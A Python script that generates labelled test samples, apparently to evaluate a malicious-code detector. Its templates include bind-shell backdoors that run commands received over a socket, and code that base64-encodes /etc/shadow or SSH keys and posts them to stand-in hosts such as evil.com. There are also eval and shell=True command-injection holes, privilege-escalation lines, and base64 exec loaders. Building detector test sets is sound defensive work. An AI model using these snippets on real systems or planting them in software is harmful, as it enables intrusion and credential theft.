#!/usr/bin/env python3
"""
Extended test sample generator - generates 50+ samples
"""

import os
import random
from pathlib import Path

# Base templates for generating variations
MALICIOUS_TEMPLATES = {
    "backdoor": [
        '''
import socket, subprocess
s = socket.socket()
s.bind(("0.0.0.0", {port}))
s.listen({backlog})
while True:
    c, a = s.accept()
    d = c.recv(1024)
    r = subprocess.check_output(d, shell=True)
    c.send(r)
''',
        '''
import socket, os
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", {port}))
sock.listen(1)
conn, addr = sock.accept()
cmd = conn.recv(4096)
os.system(cmd.decode())
'''
    ],
    "data_exfiltration": [
        '''
import requests, base64
with open("{target_file}", "rb") as f:
    d = base64.b64encode(f.read())
requests.post("{c2_url}", data={{"stolen": d}})
''',
        '''
import urllib.request, base64
data = open("{target_file}").read()
encoded = base64.b64encode(data.encode())
req = urllib.request.Request("{c2_url}", data=encoded)
urllib.request.urlopen(req)
'''
    ],
    "rce": [
        '''
import os
def handle(cmd):
    return eval(cmd)
''',
        '''
import subprocess
def run(user_input):
    return subprocess.call(user_input, shell=True)
'''
    ],
    "privilege_escalation": [
        '''
import os
os.system("sudo {command}")
os.chmod("{target}", 0o777)
''',
        '''
import os
os.setuid(0)
os.system("{command}")
'''
    ],
    "obfuscated": [
        '''
import base64
exec(base64.b64decode("{encoded}"))
''',
        '''
code = "{encoded}"
import base64
exec(compile(base64.b64decode(code), '<string>', 'exec'))
'''
    ],
    "dependency_confusion": [
        '''
from {internal_pkg} import *
import requests
data = get_secrets()
requests.post("{c2_url}", json=data)
'''
    ],
    "typosquatting": [
        '''
import {typo_pkg}
{typo_pkg}.{method}("{url}")
'''
    ]
}

CLEAN_TEMPLATES = [
    '''
"""Clean utility module."""
import json
import logging
from typing import Dict

def process(data: Dict) -> str:
    """Process data."""
    return json.dumps(data)
''',
    '''
"""Flask app."""
from flask import Flask
app = Flask(__name__)

@app.route("/")
def home():
    return "Hello World"
''',
    '''
"""Data processor."""
def transform(items):
    return [x.upper() for x in items if x]
''',
    '''
import csv
def read_data(path):
    with open(path, "r") as f:
        return list(csv.reader(f))
'''
]

# Variation data
PORTS = [4444, 5555, 6666, 7777, 8888, 9999, 12345]
BACKLOGS = [1, 5, 10]
TARGET_FILES = ["/etc/passwd", "/etc/shadow", "/home/user/.ssh/id_rsa", "/var/log/auth.log"]
C2_URLS = [
    "https://evil.com/collect",
    "https://attacker.io/exfil",
    "https://pastebin.com/raw/ABC123",
    "http://malicious.site/upload"
]
INTERNAL_PKGS = ["internal_corp", "company_secrets", "private_utils", "corp_auth"]
TYPO_PKGS = [("reqests", "requests"), ("urrlib", "urllib"), ("josn", "json"), ("urlib3", "urllib3")]
COMMANDS = ["cat /etc/passwd", "whoami", "id", "uname -a", "cat /etc/shadow"]

def generate_malicious_sample(sample_type: str, index: int) -> str:
    """Generate a malicious sample"""
    templates = MALICIOUS_TEMPLATES[sample_type]
    template = random.choice(templates)
    
    if sample_type == "backdoor":
        return template.format(port=random.choice(PORTS), backlog=random.choice(BACKLOGS))
    elif sample_type == "data_exfiltration":
        return template.format(
            target_file=random.choice(TARGET_FILES),
            c2_url=random.choice(C2_URLS)
        )
    elif sample_type == "privilege_escalation":
        return template.format(
            command=random.choice(COMMANDS),
            target="/etc/shadow"
        )
    elif sample_type == "obfuscated":
        # Simple base64 of "print('test')"
        return template.format(encoded="cHJpbnQoJ3Rlc3QnKQ==")
    elif sample_type == "dependency_confusion":
        return template.format(
            internal_pkg=random.choice(INTERNAL_PKGS),
            c2_url=random.choice(C2_URLS)
        )
    elif sample_type == "typosquatting":
        typo, _ = random.choice(TYPO_PKGS)
        return template.format(
            typo_pkg=typo,
            method="get",
            url="https://example.com"
        )
    else:
        return template

def generate_samples(output_dir: str = "test_samples", target_count: int = 50):
    """Generate 50+ test samples"""
    output_path = Path(output_dir)
    output_path.mkdir(exist_ok=True)
    
    ground_truth = {}
    count = 0
    
    # Generate malicious samples (35)
    malicious_types = ["backdoor", "data_exfiltration", "rce", "privilege_escalation", 
                       "obfuscated", "dependency_confusion", "typosquatting"]
    samples_per_type = 5
    
    for mtype in malicious_types:
        for i in range(samples_per_type):
            count += 1
            filename = f"{mtype}_{i+1:03d}.py"
            content = generate_malicious_sample(mtype, i)
            
            filepath = output_path / filename
            with open(filepath, 'w') as f:
                f.write(content.strip())
            
            ground_truth[filename] = True
            print(f"Created: {filename} (MALICIOUS - {mtype})")
    
    # Generate clean samples (15)
    clean_count = target_count - count
    for i in range(clean_count):
        count += 1
        filename = f"clean_{i+1:03d}.py"
        content = random.choice(CLEAN_TEMPLATES)
        
        filepath = output_path / filename
        with open(filepath, 'w') as f:
            f.write(content.strip())
        
        ground_truth[filename] = False
        print(f"Created: {filename} (CLEAN)")
    
    # Write ground truth
    gt_path = output_path / "ground_truth.json"
    with open(gt_path, 'w') as f:
        json.dump(ground_truth, f, indent=2)
    
    print(f"\n{'='*60}")
    print(f"Total samples generated: {count}")
    print(f"  Malicious: {sum(1 for v in ground_truth.values() if v)}")
    print(f"  Clean: {sum(1 for v in ground_truth.values() if not v)}")
    print(f"Ground truth: {gt_path}")
    print(f"{'='*60}")
    
    return count

if __name__ == "__main__":
    import json
    random.seed(42)  # Reproducible
    generate_samples()
